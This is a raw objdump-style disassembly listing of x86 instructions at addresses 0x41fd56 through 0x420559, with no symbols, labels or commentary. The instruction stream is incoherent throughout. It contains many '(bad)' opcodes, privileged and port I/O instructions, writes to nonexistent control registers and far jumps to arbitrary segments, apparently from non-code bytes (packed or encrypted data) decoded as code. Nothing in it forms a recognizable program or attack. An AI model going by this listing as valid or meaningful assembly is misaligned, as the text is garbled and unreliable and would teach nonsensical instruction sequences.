  41fd56:	mov    BYTE PTR [esi+eax*1+0x4b3c9146],al
  41fd5d:	mov    al,ah
  41fd5f:	ficom  DWORD PTR [edi-0x13304795]
  41fd65:	mov    ch,0xb7
  41fd67:	lea    esp,[ebx+0x68]
  41fd6a:	pop    edi
  41fd6b:	cmp    ebp,DWORD PTR [esi-0x41]
  41fd6e:	xor    edi,esp
  41fd70:	inc    edi
  41fd71:	xchg   esi,eax
  41fd72:	cmp    dl,dl
  41fd74:	imul   ebp,ebx,0x841da939
  41fd7a:	es mov esi,0xb6512e4c
  41fd80:	xchg   DWORD PTR [esi-0x42],edx
  41fd83:	cmp    bh,BYTE PTR [ebp+ebp*2+0x68]
  41fd87:	cmp    eax,0xa7c55162
  41fd8c:	add    eax,0xa23df911
  41fd91:	mov    al,ds:0x68b46031
  41fd96:	dec    edi
  41fd97:	and    edi,DWORD PTR [edi-0x2832c1ac]
  41fd9d:	inc    eax
  41fd9e:	fld    DWORD PTR [edx+ebp*2+0x1d8174f8]
  41fda5:	cmp    edi,DWORD PTR [ebp+0x57418ff0]
  41fdab:	lods   al,BYTE PTR ds:[esi]
  41fdac:	mov    esi,0x5053503c
  41fdb1:	pop    ds
  41fdb2:	jo     0x41fdec
  41fdb4:	xor    edi,ebx
  41fdb6:	loope  0x41fdba
  41fdb8:	push   es
  41fdb9:	xchg   DWORD PTR [ebp+edi*2-0x67197bc5],eax
  41fdc0:	aas    
  41fdc1:	fcmovnbe st,st(5)
  41fdc3:	(bad)  
  41fdc4:	xchg   esi,eax
  41fdc5:	iret   
  41fdc6:	dec    ebp
  41fdc7:	aaa    
  41fdc8:	and    al,0xd2
  41fdca:	loope  0x41fd9d
  41fdcc:	mov    ah,0xe0
  41fdce:	mov    WORD PTR [eax],?
  41fdd0:	(bad)  
  41fdd1:	cdq    
  41fdd2:	mov    BYTE PTR [ecx-0x70],al
  41fdd5:	out    dx,eax
  41fdd6:	sub    ecx,DWORD PTR ds:0x2846ae10
  41fddc:	mov    edi,DWORD PTR [esi]
  41fdde:	push   ds
  41fddf:	cld    
  41fde0:	(bad)  
  41fde1:	or     DWORD PTR [eax+eiz*8+0x35f92469],ecx
  41fde8:	jle    0x41fdc9
  41fdea:	in     eax,dx
  41fdeb:	sbb    DWORD PTR [esi],edi
  41fded:	mov    ds:0xbc198b81,eax
  41fdf2:	scas   al,BYTE PTR es:[edi]
  41fdf3:	fnstsw WORD PTR [ecx-0x10]
  41fdf6:	push   cs
  41fdf7:	dec    esp
  41fdf8:	jns    0x41fdf4
  41fdfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdfb:	push   ecx
  41fdfc:	(bad)  
  41fdfd:	sbb    BYTE PTR [ebx],ch
  41fdff:	xchg   BYTE PTR [edx+esi*4+0x65ff290b],cl
  41fe06:	in     al,dx
  41fe07:	xchg   al,bl
  41fe09:	and    BYTE PTR [ebx-0x38],dl
  41fe0c:	gs inc eax
  41fe0e:	sub    BYTE PTR [ecx+eax*8-0x47],dl
  41fe12:	out    dx,eax
  41fe13:	retf   
  41fe14:	(bad)  
  41fe15:	cli    
  41fe16:	xchg   ebp,eax
  41fe17:	xchg   edi,eax
  41fe18:	cmc    
  41fe19:	and    ecx,esi
  41fe1b:	jmp    0x41fe94
  41fe1d:	sbb    BYTE PTR [ecx+0x30],cl
  41fe20:	mov    DWORD PTR [ebx-0x75],ebx
  41fe23:	sbb    bl,BYTE PTR [ebx-0x49]
  41fe26:	js     0x41fe39
  41fe28:	push   edx
  41fe29:	sbb    eax,DWORD PTR [edi+0x1c566129]
  41fe2f:	mov    dh,0xa
  41fe31:	xor    al,0xa9
  41fe33:	xor    DWORD PTR [ebp+ebx*1+0x65234002],esp
  41fe3a:	cmp    al,0x3a
  41fe3c:	or     ch,BYTE PTR ds:0xc4f37c29
  41fe42:	jo     0x41fe24
  41fe44:	fmul   QWORD PTR [edi-0x545744af]
  41fe4a:	aam    0xd7
  41fe4c:	fs xchg ecx,eax
  41fe4e:	sub    DWORD PTR [ebp-0x7c539c1e],edx
  41fe54:	addr16 repz sub esp,0x22
  41fe59:	test   eax,0x7587593f
  41fe5e:	jecxz  0x41fe39
  41fe60:	mov    dl,BYTE PTR ds:0x7325302a
  41fe66:	mov    ebx,0x9faefd7
  41fe6b:	in     eax,dx
  41fe6c:	cmp    ch,ah
  41fe6e:	shl    esp,cl
  41fe70:	add    DWORD PTR [ebx+eiz*8],0x750fbd6b
  41fe77:	mov    ebx,0xc5d8c343
  41fe7c:	aam    0xc6
  41fe7e:	sbb    DWORD PTR [edx+0x18cbb395],ebp
  41fe84:	inc    ebp
  41fe85:	sbb    DWORD PTR ds:0xc91b0c95,0xf
  41fe8c:	sub    BYTE PTR [eax],ch
  41fe8e:	ret    
  41fe8f:	add    al,BYTE PTR [esi+0x2d]
  41fe92:	push   ds
  41fe93:	mov    eax,0x62646ef2
  41fe98:	shl    esp,cl
  41fe9a:	sub    DWORD PTR [esi-0x19cd9a0e],ecx
  41fea0:	sbb    DWORD PTR [ebp+0x48],eax
  41fea3:	rcr    BYTE PTR [esp+edx*2],1
  41fea6:	or     ebx,edi
  41fea8:	ret    
  41fea9:	fidivr DWORD PTR [ebx+0x1e]
  41feac:	daa    
  41fead:	loope  0x41fe79
  41feaf:	jmp    0x8d7e7442
  41feb4:	pop    ecx
  41feb5:	mov    dl,0xa5
  41feb7:	out    dx,al
  41feb8:	lods   eax,DWORD PTR ds:[esi]
  41feb9:	or     DWORD PTR [esp+ebp*8+0x25],0xffffffbb
  41febe:	adc    ecx,DWORD PTR [ecx+0x6c]
  41fec1:	inc    ebx
  41fec2:	mov    ah,0xf4
  41fec4:	sbb    al,0x96
  41fec6:	pop    esp
  41fec7:	cmp    DWORD PTR [ebp+0x5],0x64
  41fecb:	jmp    0x479e:0x31508a88
  41fed2:	stos   DWORD PTR es:[edi],eax
  41fed3:	xchg   edx,eax
  41fed4:	adc    eax,0xf790acc2
  41fed9:	ins    DWORD PTR es:[edi],dx
  41feda:	mov    bl,0xe9
  41fedc:	dec    eax
  41fedd:	mov    cs,WORD PTR ds:0x28e96d49
  41fee3:	(bad)  
  41fee4:	pop    ss
  41fee5:	push   ss
  41fee6:	mov    ah,0x74
  41fee8:	push   ecx
  41fee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feea:	pop    esp
  41feeb:	test   al,0x72
  41feed:	lea    ecx,[edi-0x41a9a286]
  41fef3:	push   esi
  41fef4:	pop    esp
  41fef5:	jb     0x41fe85
  41fef7:	test   al,0x97
  41fef9:	dec    BYTE PTR [esi+0xf]
  41fefc:	xchg   BYTE PTR [edx],al
  41fefe:	neg    DWORD PTR [ebp-0x23]
  41ff01:	mov    cl,0xf8
  41ff03:	add    dh,dl
  41ff05:	dec    eax
  41ff06:	jge    0x41fee4
  41ff08:	fnstenv [ecx-0x60]
  41ff0b:	nop
  41ff0c:	xor    ebp,DWORD PTR [esi+0x275bdce8]
  41ff12:	aas    
  41ff13:	pop    edx
  41ff14:	popa   
  41ff15:	cmp    eax,0xcd2cc23f
  41ff1a:	sbb    dl,ch
  41ff1c:	pop    esi
  41ff1d:	or     al,dl
  41ff1f:	sbb    eax,0x996176fa
  41ff24:	add    DWORD PTR [eax],0xffffffcf
  41ff27:	pop    ss
  41ff28:	dec    edx
  41ff29:	and    cl,BYTE PTR [edi]
  41ff2b:	shl    BYTE PTR fs:[ebp+0x9],1
  41ff2f:	shl    DWORD PTR [eax-0x771e8ba4],cl
  41ff35:	sbb    esi,0xffffffaf
  41ff38:	jmp    0x37b32f31
  41ff3d:	pushf  
  41ff3e:	push   ss
  41ff3f:	xchg   edx,eax
  41ff40:	pop    ebx
  41ff41:	cmp    eax,0x37e0ab79
  41ff46:	xor    DWORD PTR [ecx-0x6d37d1e1],ecx
  41ff4c:	cmp    edi,ebp
  41ff4e:	mov    bl,0xe2
  41ff50:	lods   eax,DWORD PTR ds:[esi]
  41ff51:	xchg   ebx,eax
  41ff52:	adc    al,0x2f
  41ff54:	mov    bh,0x47
  41ff56:	dec    esp
  41ff57:	repz sahf 
  41ff59:	out    0xf4,eax
  41ff5b:	xchg   esp,eax
  41ff5c:	not    BYTE PTR [eax]
  41ff5e:	fwait
  41ff5f:	dec    esi
  41ff60:	lea    ebx,[ecx+0x68]
  41ff63:	pop    ebp
  41ff64:	es cli 
  41ff66:	inc    ecx
  41ff67:	xor    BYTE PTR [ebp+0x2d],dl
  41ff6a:	jmp    0xd166462b
  41ff6f:	out    dx,eax
  41ff70:	sbb    ch,al
  41ff72:	add    ecx,DWORD PTR [ecx+0x394b8880]
  41ff78:	sbb    BYTE PTR [ebp+eiz*1-0x18],dl
  41ff7c:	lods   eax,DWORD PTR ds:[esi]
  41ff7d:	dec    edx
  41ff7e:	cmc    
  41ff7f:	rcl    BYTE PTR [edi+eax*2+0xe4cbdb5],1
  41ff86:	ins    DWORD PTR es:[edi],dx
  41ff87:	mov    esi,0x11ac6628
  41ff8c:	jbe    0x41ffed
  41ff8e:	jo     0x41ff75
  41ff90:	cli    
  41ff91:	jg     0x41ff2f
  41ff93:	xor    eax,0x49ddba48
  41ff98:	arpl   WORD PTR [esi+eiz*8-0x7b244764],si
  41ff9f:	add    ebp,DWORD PTR [ebx-0x44e66ae4]
  41ffa5:	dec    ecx
  41ffa6:	xor    DWORD PTR [esi],ebx
  41ffa8:	or     al,bl
  41ffaa:	test   eax,0x2f9f6ce3
  41ffaf:	js     0x41ff54
  41ffb1:	adc    eax,ebx
  41ffb3:	mov    ecx,0x2be5914d
  41ffb8:	daa    
  41ffb9:	xchg   ebp,eax
  41ffba:	xor    al,0x7c
  41ffbc:	dec    esp
  41ffbd:	mov    cl,0xd4
  41ffbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffc0:	and    bh,BYTE PTR [ebx+0xca9e72e]
  41ffc6:	mov    dh,0xf2
  41ffc8:	test   ebx,0x35be68b7
  41ffce:	mov    bl,0x42
  41ffd0:	imul   edi,DWORD PTR [esp+esi*2-0x31f669c2],0xffffffe3
  41ffd8:	les    edx,FWORD PTR [esi-0x671f0f73]
  41ffde:	xchg   edx,eax
  41ffdf:	pop    esi
  41ffe0:	pop    edx
  41ffe1:	xchg   BYTE PTR [edx-0x7aadaea6],al
  41ffe7:	push   ebp
  41ffe8:	std    
  41ffe9:	imul   eax,DWORD PTR [edx+0x53],0x6f
  41ffed:	mov    bh,0xe8
  41ffef:	das    
  41fff0:	cmp    ebp,DWORD PTR [edi+0x4f3c236b]
  41fff6:	and    eax,0xf395012f
  41fffb:	mov    esi,0xabe3b23c
  420000:	inc    edi
  420001:	aam    0x7c
  420003:	test   eax,0x3e021687
  420008:	cmp    al,0x98
  42000a:	imul   ebp,DWORD PTR [eax+0x60dfca4c],0xa318357b
  420014:	mov    edx,0x8fa1be18
  420019:	cdq    
  42001a:	jmp    0x6d221564
  42001f:	xor    BYTE PTR [edx-0x71],al
  420022:	jo     0x42000d
  420024:	rol    bl,0x8e
  420027:	pop    DWORD PTR [edi]
  420029:	mov    BYTE PTR [ebx],bl
  42002b:	(bad)  
  42002d:	imul   ecx,edi,0x4fc8d5ac
  420033:	stos   BYTE PTR es:[edi],al
  420034:	popa   
  420035:	push   es
  420036:	jecxz  0x42009a
  420038:	xor    al,0x39
  42003a:	je     0x420006
  42003c:	push   0x44
  42003e:	jns    0x42008e
  420040:	mov    ebp,0xaefd19c6
  420045:	jg     0x4200a7
  420047:	pop    es
  420048:	scas   eax,DWORD PTR es:[edi]
  420049:	mov    esi,DWORD PTR [edx-0x1]
  42004c:	push   edi
  42004d:	and    edi,DWORD PTR [ecx]
  42004f:	vaddss xmm4,xmm7,DWORD PTR [edx]
  420053:	jl     0x4200c4
  420055:	in     eax,dx
  420056:	sub    DWORD PTR [ecx+0x6a],esp
  420059:	mov    es,WORD PTR [edi]
  42005b:	push   0xffffffb9
  42005d:	fld    TBYTE PTR [eax+0x7d]
  420060:	jno    0x420054
  420062:	and    ecx,DWORD PTR [edi+0x3b751b0f]
  420068:	push   eax
  420069:	and    DWORD PTR [esi-0x74],esi
  42006c:	sar    DWORD PTR [ecx],1
  42006e:	push   DWORD PTR [edi]
  420070:	and    eax,0xe824783e
  420075:	mov    dh,BYTE PTR [edx-0x4f4c7155]
  42007b:	jecxz  0x42001a
  42007d:	fwait
  42007e:	dec    ecx
  42007f:	sbb    ebp,DWORD PTR [edi-0x59c5246b]
  420085:	es adc dh,0x7d
  420089:	inc    ecx
  42008a:	sbb    eax,0x6bcc7fd6
  42008f:	je     0x420104
  420091:	loop   0x4200d8
  420093:	call   0xcb70aa1a
  420098:	sub    BYTE PTR [esi+ecx*4+0x34],bl
  42009c:	imul   esi,DWORD PTR [esi+0x4c8fda30],0xdaba99a
  4200a6:	jmp    0x251c74f3
  4200ab:	or     esi,DWORD PTR [edi-0x6d2be4f6]
  4200b1:	add    al,BYTE PTR [ecx+0x4e99254b]
  4200b7:	cmp    BYTE PTR [ecx],0xc1
  4200ba:	push   0x21f180a2
  4200bf:	fwait
  4200c0:	icebp  
  4200c1:	imul   ebx,DWORD PTR [edx-0x666ba898],0xffffffae
  4200c8:	and    ah,BYTE PTR [edi-0x1a]
  4200cb:	or     DWORD PTR [ebx-0x252acfd1],eax
  4200d1:	add    BYTE PTR [esp+ecx*2-0x5750b468],0x85
  4200d9:	out    0x32,eax
  4200db:	clc    
  4200dc:	mov    eax,0x9cc431ce
  4200e2:	mov    BYTE PTR [esi],dl
  4200e4:	mov    esp,0x54aba73c
  4200e9:	je     0x4200a4
  4200eb:	(bad)  
  4200ec:	mov    ds:0x75d8d051,al
  4200f1:	inc    edx
  4200f2:	push   esp
  4200f3:	out    dx,al
  4200f4:	cmp    al,0xf3
  4200f6:	int    0xc8
  4200f8:	pop    esi
  4200f9:	sti    
  4200fa:	fld    TBYTE PTR [esi+ecx*8-0x142d75c5]
  420101:	inc    ebp
  420102:	mov    ebx,0xce4a1b53
  420107:	inc    esi
  420108:	sub    BYTE PTR [eax-0x80],0xff
  42010c:	test   DWORD PTR [ebp-0x43],ebx
  42010f:	lds    edi,FWORD PTR [eax]
  420111:	add    BYTE PTR [ecx-0x3b4b70bc],ch
  420117:	sbb    al,0xaa
  420119:	adc    DWORD PTR [edx+0x5d3c2ac7],0x7d
  420120:	test   DWORD PTR [esi],ebx
  420122:	mov    eax,0xab3bcee9
  420127:	push   ds
  420128:	iret   
  420129:	xor    eax,0x7854cfb8
  42012e:	in     al,dx
  42012f:	cwde   
  420130:	mov    edi,0x945ffece
  420135:	and    eax,0x88caeadc
  42013a:	retf   0x6dd3
  42013d:	ins    BYTE PTR es:[edi],dx
  42013e:	or     DWORD PTR [ebp+0x4e],ecx
  420141:	cld    
  420142:	repnz mov al,ds:0xaff577da
  420148:	mov    dh,dl
  42014a:	es mov esp,0xef9e688d
  420150:	leave  
  420151:	ja     0x420167
  420153:	mov    cr1,ebx
  420156:	adc    BYTE PTR ds:0x5b37c430,0xcb
  42015d:	jp     0x42017b
  42015f:	(bad)  
  420160:	cmp    ebp,DWORD PTR [edx+0x5f]
  420163:	rol    BYTE PTR [ecx],1
  420165:	loopne 0x420168
  420167:	xlat   BYTE PTR cs:[ebx]
  420169:	pop    ds
  42016a:	inc    ebx
  42016b:	sub    eax,0x5925d8fd
  420170:	xchg   ebp,eax
  420171:	(bad)  
  420172:	sub    edx,ebp
  420174:	mov    ds:0xc82df450,eax
  420179:	mov    bl,0x83
  42017b:	adc    DWORD PTR [esi],esi
  42017d:	xor    al,0x62
  42017f:	add    BYTE PTR [esi],0x6b
  420182:	lea    ecx,[ebx+0xc]
  420185:	fs inc esp
  420187:	imul   edi,edi,0x1fe318da
  42018d:	add    al,0x0
  42018f:	mov    ecx,0x5e20046e
  420194:	lds    ebp,FWORD PTR [esi]
  420196:	jno    0x42015c
  420198:	daa    
  420199:	push   edi
  42019a:	loopne 0x42020b
  42019c:	cwde   
  42019d:	mov    eax,ds:0x6c2d6a2
  4201a2:	mov    dh,0x61
  4201a4:	dec    ecx
  4201a5:	jl     0x420206
  4201a7:	std    
  4201a8:	sbb    esp,ebp
  4201aa:	jmp    0x85c7:0x4be2a5e8
  4201b1:	push   es
  4201b2:	inc    esi
  4201b3:	adc    eax,0x7a67720
  4201b8:	jnp    0x42020f
  4201ba:	imul   ebx,ebp,0x425a2fbe
  4201c0:	sbb    ebp,ebx
  4201c2:	test   BYTE PTR [edi+0x3c377248],cl
  4201c8:	push   ebp
  4201c9:	fwait
  4201ca:	sub    eax,0x3f730537
  4201cf:	lds    esp,FWORD PTR [edi+0x40b354a3]
  4201d5:	sub    al,0xfe
  4201d7:	loop   0x420215
  4201d9:	pop    edx
  4201da:	jb     0x42016f
  4201dc:	pusha  
  4201dd:	jmp    0x6291:0x72dc21d0
  4201e4:	sub    BYTE PTR [eax-0x7ababffd],bh
  4201ea:	ret    
  4201eb:	fistp  WORD PTR ds:0x937f32cb
  4201f1:	inc    BYTE PTR [esi]
  4201f3:	stc    
  4201f4:	(bad)
  4201f7:	mov    dl,0xd5
  4201f9:	mov    bl,0x6f
  4201fb:	mov    al,ds:0xb2cef821
  420200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420201:	mov    ecx,es
  420203:	dec    ebp
  420204:	and    al,0xb1
  420206:	sbb    ch,BYTE PTR [ebx+0x23]
  420209:	add    BYTE PTR [eax-0x287e12a],al
  42020f:	mov    WORD PTR [edi],?
  420211:	loop   0x420234
  420213:	xchg   ecx,eax
  420214:	pop    esp
  420215:	cmp    ch,BYTE PTR [ebx+0x7c]
  420218:	adc    BYTE PTR [ebx-0x70],cl
  42021b:	xchg   DWORD PTR [ebx],esi
  42021d:	xchg   DWORD PTR [ecx-0x1f],edi
  420220:	int    0x38
  420222:	loop   0x420230
  420224:	pop    ebx
  420225:	ja     0x4201d1
  420227:	inc    ecx
  420228:	imul   eax,eax,0xdfe19366
  42022e:	adc    eax,0x847d4d03
  420233:	pop    esp
  420234:	mov    dl,0x7d
  420236:	and    eax,0x47e42ef2
  42023b:	loop   0x4202ab
  42023d:	pop    edx
  42023e:	stos   DWORD PTR es:[edi],eax
  42023f:	cmp    dh,ch
  420241:	(bad)  
  420242:	ds push ecx
  420244:	popa   
  420245:	aam    0x71
  420247:	out    dx,al
  420248:	daa    
  420249:	lds    ebp,FWORD PTR [ebp+0x72f7da2c]
  42024f:	daa    
  420250:	dec    esi
  420251:	jg     0x42021a
  420253:	das    
  420254:	enter  0xf564,0x12
  420258:	lods   al,BYTE PTR ds:[esi]
  420259:	push   ds
  42025a:	pop    esp
  42025b:	adc    eax,0x3d79145a
  420260:	sar    edx,0x8
  420263:	xchg   esi,eax
  420264:	add    BYTE PTR [eax],bh
  420266:	leave  
  420267:	nop
  420268:	adc    al,cl
  42026a:	sahf   
  42026b:	mov    ds:0xe5e180cc,al
  420270:	daa    
  420271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420272:	das    
  420273:	add    dl,BYTE PTR [eax-0x47]
  420276:	xchg   esp,eax
  420277:	mov    ds:0x5b5766c4,al
  42027c:	pop    ss
  42027d:	jo     0x420232
  42027f:	call   0x23e:0x513e88d7
  420286:	retf   
  420287:	les    edx,FWORD PTR [ecx-0x39]
  42028a:	pop    ebx
  42028b:	imul   ecx,DWORD PTR [edi-0x1d],0xffffffd1
  42028f:	mov    al,0x87
  420291:	or     cl,BYTE PTR [esp+esi*1-0x771d7665]
  420298:	fs jno 0x4202e3
  42029b:	(bad)  
  42029c:	or     al,0x16
  42029e:	add    eax,0x55ccd2ac
  4202a3:	sub    DWORD PTR [esp+esi*2+0x24],esi
  4202a7:	repnz loopne 0x4202bc
  4202aa:	sar    DWORD PTR [ecx+0x489be514],cl
  4202b0:	and    ebx,eax
  4202b2:	popa   
  4202b3:	dec    esi
  4202b4:	int    0xa3
  4202b6:	test   DWORD PTR [ebx-0x22],eax
  4202b9:	xlat   BYTE PTR ds:[ebx]
  4202ba:	rcr    DWORD PTR [ecx+0x5957be59],0x53
  4202c1:	fdiv   QWORD PTR [esi]
  4202c3:	repz mov esi,0xd1c77850
  4202c9:	in     al,0x24
  4202cb:	ret    
  4202cc:	neg    BYTE PTR [ebx-0x51d12dc8]
  4202d2:	fstp   QWORD PTR [eax-0x48]
  4202d5:	sub    cl,BYTE PTR [ecx+ecx*2+0x146c342b]
  4202dc:	jecxz  0x4202ac
  4202de:	add    DWORD PTR [edx+0x5427522c],eax
  4202e4:	aam    0x71
  4202e6:	or     edx,DWORD PTR [esi+0x72190d82]
  4202ec:	mov    edx,DWORD PTR [ebx+0x79106582]
  4202f2:	mov    fs,WORD PTR [eax+0x70]
  4202f5:	mov    cl,0x21
  4202f7:	ins    DWORD PTR es:[edi],dx
  4202f8:	add    eax,0xe4972bb2
  4202fd:	fwait
  4202fe:	int3   
  4202ff:	and    eax,0xddbcaf7f
  420304:	ja     0x42032a
  420306:	and    eax,0x84f83826
  42030b:	fstp   TBYTE PTR [esi-0x2c]
  42030e:	stc    
  42030f:	sbb    eax,0xa96aeb8d
  420314:	add    dh,ch
  420316:	and    eax,0x2f162dc7
  42031b:	pop    edi
  42031c:	call   0x28cb20cf
  420321:	xor    BYTE PTR [ecx+0x7c],dl
  420324:	xor    dh,BYTE PTR ds:[esi+0x51]
  420328:	aam    0x82
  42032a:	adc    dh,BYTE PTR ds:0xc5ec39a4
  420330:	cmp    ah,bh
  420332:	pusha  
  420333:	and    esp,ebp
  420335:	dec    si
  420337:	push   ds
  420338:	xor    cl,bl
  42033a:	sub    eax,0x79f757a6
  42033f:	xor    esp,edi
  420341:	cdq    
  420342:	scas   eax,DWORD PTR es:[edi]
  420343:	sub    eax,0x2375b8f
  420348:	jle    0x1b59bc76
  42034e:	push   ebx
  42034f:	and    ecx,DWORD PTR [edx-0x57]
  420352:	xchg   DWORD PTR [edx+ebx*4-0x1d202f44],edx
  420359:	jmp    0xbdf690b8
  42035e:	sbb    BYTE PTR [edx+esi*8+0x74c020a2],al
  420365:	push   ss
  420366:	lock scas eax,DWORD PTR es:[edi]
  420368:	and    eax,0xe91c9519
  42036d:	xchg   edi,ebx
  42036f:	js     0x420356
  420371:	xchg   esp,eax
  420372:	or     al,0x52
  420374:	xlat   BYTE PTR ds:[ebx]
  420375:	add    edi,DWORD PTR ds:0x529dcee5
  42037b:	repnz mov ah,0xe3
  42037e:	inc    esp
  42037f:	fnsave [ebp+0x30]
  420382:	pusha  
  420383:	or     ah,ah
  420385:	out    0x2,al
  420387:	xchg   BYTE PTR [esi-0x25fde0d9],ah
  42038d:	test   DWORD PTR [ecx],ecx
  42038f:	mov    dl,0xdf
  420391:	jbe    0x4203b5
  420393:	and    eax,0x4af5f51e
  420398:	fiadd  WORD PTR [ecx]
  42039a:	cwde   
  42039b:	(bad)  
  42039c:	mov    ebx,0xfb9e7043
  4203a1:	mov    ch,0x26
  4203a3:	data16 sahf 
  4203a5:	jmp    0x420395
  4203a7:	dec    esp
  4203a8:	cmp    edi,DWORD PTR [ecx+ebx*1-0x62]
  4203ac:	addr16 dec ebx
  4203ae:	out    dx,eax
  4203af:	test   DWORD PTR [edx],esp
  4203b1:	rol    DWORD PTR [esi],0xb
  4203b4:	xor    eax,ebp
  4203b6:	push   es
  4203b7:	nop
  4203b8:	dec    edx
  4203b9:	fadd   DWORD PTR [ebx+0x5b]
  4203bc:	jb     0x42037a
  4203be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203bf:	push   edx
  4203c0:	adc    al,0x4c
  4203c2:	pop    ebx
  4203c3:	retf   
  4203c4:	jo     0x42036f
  4203c6:	mov    ds,WORD PTR [ebx-0x5b34b3c5]
  4203cc:	cld    
  4203cd:	dec    ebp
  4203ce:	pop    edi
  4203cf:	add    dh,ah
  4203d1:	pop    ss
  4203d2:	add    dh,BYTE PTR [edi+0x62]
  4203d5:	add    DWORD PTR [edi+edi*1],esp
  4203d8:	mov    ebx,0xb09aa28
  4203dd:	faddp  st(2),st
  4203df:	dec    eax
  4203e0:	popf   
  4203e1:	and    edi,edi
  4203e3:	mov    dh,BYTE PTR [ecx-0x20]
  4203e6:	stc    
  4203e7:	test   BYTE PTR [edx],ch
  4203e9:	in     eax,dx
  4203ea:	dec    esi
  4203eb:	mov    ebx,0x21f7636f
  4203f0:	sub    al,0x8e
  4203f2:	or     edi,edx
  4203f4:	imul   ebp,DWORD PTR [ecx+0x4f08bc80],0xffffffb9
  4203fb:	scas   al,BYTE PTR es:[edi]
  4203fc:	fsubr  st,st(2)
  4203fe:	sub    al,0x4a
  420400:	mov    bh,0x1d
  420402:	and    DWORD PTR [edx+0x49ccaf74],eax
  420408:	lea    ecx,[esi+0x1788b2e2]
  42040e:	push   cs
  42040f:	shr    DWORD PTR [esi+edi*4+0x7e54774f],cl
  420416:	fisub  DWORD PTR [esi+0x11]
  420419:	sbb    al,0x25
  42041b:	getsec 
  42041d:	out    0x7f,eax
  42041f:	pop    ss
  420420:	jle    0x42046b
  420422:	mov    ebp,DWORD PTR [eax-0x7d2dc146]
  420428:	mov    esi,0xe67db733
  42042d:	out    0x3e,eax
  42042f:	popf   
  420430:	fisttp QWORD PTR [esi+0x51c7be10]
  420436:	shl    DWORD PTR [edx+0x4b7c8fdb],0xda
  42043d:	push   esp
  42043e:	pop    edx
  42043f:	fcmovnb st,st(3)
  420441:	ds je  0x4203cc
  420444:	sub    DWORD PTR [eax],ebp
  420446:	push   esi
  420447:	in     al,0xca
  420449:	and    BYTE PTR [ecx+0x7f],bh
  42044c:	sub    eax,edx
  42044e:	aaa    
  42044f:	sbb    BYTE PTR [ebx+edx*2-0x7c],bl
  420453:	xchg   ecx,eax
  420454:	imul   esi,DWORD PTR [edx],0x39c9164b
  42045a:	into   
  42045b:	pop    edi
  42045c:	imul   edi,DWORD PTR [eax+0x41acff39],0x5
  420463:	ins    DWORD PTR es:[edi],dx
  420464:	aas    
  420465:	cmp    bl,BYTE PTR [edi+0x7a]
  420468:	add    eax,DWORD PTR [ebx-0x48343fc3]
  42046e:	inc    bx
  420470:	sub    ebx,edx
  420472:	add    al,0xa9
  420474:	or     cl,ch
  420476:	inc    ecx
  420477:	repnz imul ebx,DWORD PTR [esi-0x5f85def9],0x4c
  42047f:	pushw  0x734a
  420483:	xchg   ebx,eax
  420484:	sub    dl,BYTE PTR [edi+0x41294c76]
  42048a:	sbb    al,0x3f
  42048c:	aas    
  42048d:	stos   BYTE PTR es:[edi],al
  42048e:	mov    ecx,0x46cc12d1
  420493:	mov    cl,0xc9
  420495:	pop    ds
  420496:	adc    BYTE PTR [ebp+0x4c2fab82],bl
  42049c:	mov    ebx,0x4281830f
  4204a1:	dec    esi
  4204a2:	retf   0x641f
  4204a5:	dec    edi
  4204a6:	push   edi
  4204a7:	xchg   BYTE PTR ds:0x93d0f01b,ah
  4204ad:	inc    edi
  4204ae:	pusha  
  4204af:	dec    ebx
  4204b0:	sub    al,0x1f
  4204b2:	lods   eax,DWORD PTR ds:[esi]
  4204b3:	add    DWORD PTR ds:0xa7911a6,eax
  4204b9:	jge    0x420444
  4204bb:	pop    esp
  4204bc:	pop    edx
  4204bd:	ror    DWORD PTR [esp+ecx*4+0x3],1
  4204c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204c2:	jmp    0x4204fb
  4204c4:	ja     0x420525
  4204c6:	xchg   edi,eax
  4204c7:	scas   eax,DWORD PTR es:[edi]
  4204c8:	rol    BYTE PTR [ebx+0x14],0xa2
  4204cc:	and    DWORD PTR [ebp*8+0x6fdeac88],edi
  4204d3:	pop    ebx
  4204d4:	in     al,dx
  4204d5:	sbb    BYTE PTR [ecx],dh
  4204d7:	mov    bl,BYTE PTR [ebx]
  4204d9:	xchg   edx,eax
  4204da:	add    ch,dh
  4204dc:	loope  0x4204f9
  4204de:	pop    ds
  4204df:	inc    eax
  4204e0:	(bad)  
  4204e1:	js     0x4204e8
  4204e3:	in     al,dx
  4204e4:	mov    esp,0x84e604c1
  4204e9:	adc    BYTE PTR [esi+ecx*8],0xe1
  4204ed:	jb     0x4204b9
  4204ef:	dec    edx
  4204f0:	sbb    BYTE PTR [edx],ch
  4204f2:	mov    BYTE PTR [eax+0x52299f74],0x10
  4204f9:	push   eax
  4204fa:	(bad)  
  4204fc:	xor    edi,DWORD PTR [esp+edi*2+0x129c2e15]
  420503:	push   0x87ae70b7
  420508:	repnz xor esi,esi
  42050b:	rcr    DWORD PTR [ebp+0x39],0x93
  42050f:	cmc    
  420510:	mov    al,ds:0x67f8645c
  420515:	pop    eax
  420516:	jmp    0xdc0f:0xa341a4c2
  42051d:	stos   DWORD PTR es:[edi],eax
  42051e:	jmp    0x4204c7
  420520:	dec    edi
  420521:	xchg   ebp,eax
  420522:	mov    esp,0xc815f7f1
  420527:	xor    bh,0x19
  42052a:	loope  0x4204e4
  42052c:	test   BYTE PTR [eax-0x76],bl
  42052f:	jno    0x4204c7
  420531:	daa    
  420532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420533:	inc    ecx
  420534:	pop    ebp
  420535:	in     al,0xe3
  420537:	inc    edi
  420538:	les    ecx,FWORD PTR [ecx+0x39]
  42053b:	std    
  42053c:	js     0x4204fa
  42053e:	dec    esi
  42053f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420540:	std    
  420541:	out    dx,eax
  420542:	adc    cl,bh
  420544:	cld    
  420545:	and    DWORD PTR [edi+0x53],edx
  420548:	add    ebp,DWORD PTR [edx-0x50]
  42054b:	push   0x187c0935
  420550:	xor    esi,DWORD PTR ds:0x8466ae6d
  420556:	inc    edi
  420557:	jecxz  0x4205b0
  420559:	lods   eax,DWORD PTR ds:[esi]
